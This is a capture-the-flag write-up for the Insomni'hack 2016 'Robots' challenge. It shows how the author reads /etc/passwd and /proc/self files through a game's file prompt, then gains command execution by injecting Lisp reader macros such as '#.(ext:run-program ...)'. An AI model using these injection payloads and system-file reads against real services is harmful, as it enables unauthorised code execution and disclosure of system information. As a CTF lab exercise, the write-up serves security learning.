#Insomni'hack CTF 2016 : Robots

##Write-up

###First part :
This challenge is about the famous game called [robots](https://en.wikipedia.org/wiki/Robots_%28computer_game%29).
Service is running on `robots.insomni.hack:4242`. In the first part of this challenge, you have to won the game in order to get a prompt like this : `r to read a file, c to play again, q to quit`

###Second part:
You can read the `/etc/passwd` file and find two username which can be useful (or not) : `robots` and `robots_pwned`.
In order to know the user which run the service, we can read this file : `/proc/self/environ`. The user running the service is `robots`.
After some research, it was impossible to find something in the home directory of theses users.
It is possible to know which file is used for this service with the `/proc/self/cmdline` and get this kind of ouput : `/usr/bin/myprog\0foo bar\0baz`. The output was concatened but the last part was the name of the script : `robots.lisp`

With this information, you can get the source code of the game : [pastebin](http://pastebin.com/EzsPiFrs)

###Third part :
With the source code, we can now understand how it works, a common way to exploit lisp script is the following :

*Theoretically LispInjection could be to lisp-driven applications what SqlInjection is to databases-- a common programming error that results in security holes. LispInjection could happen if the application allows a user to enter values (such as via a form) that the application concatenates into a string containing a Lisp statement that is later "run as code", after all an important part of Lisp philosophy is that "code is data and data is code".* [wiki](http://c2.com/cgi/wiki?LispInjection)

So, after some analysis, the vulnerables part of this script is at line 21 and 50 (prompt to read file and prompt to move on the game) with the "read" instruction which will execute our input as code. So, we can use this kind of command in order to verify the correct execution of our input : `#.(ext:run-program "find")` like this :

```
r to read a file, c to play again, q to quit
#.(ext:run-program "find")
.
./getflag
./getflag/flag
./getflag/read_flag
./robots.lisp
Invalid command
```

It works :D so, the last thing to do is to read the flag with the read_flag binary like this :
`#.(ext:run-program "./getflag/read_flag")`and get the flag !

Enjoy, thanks to my teammate Beuc for the help.
[Rawger](https://twitter.com/_rawger)
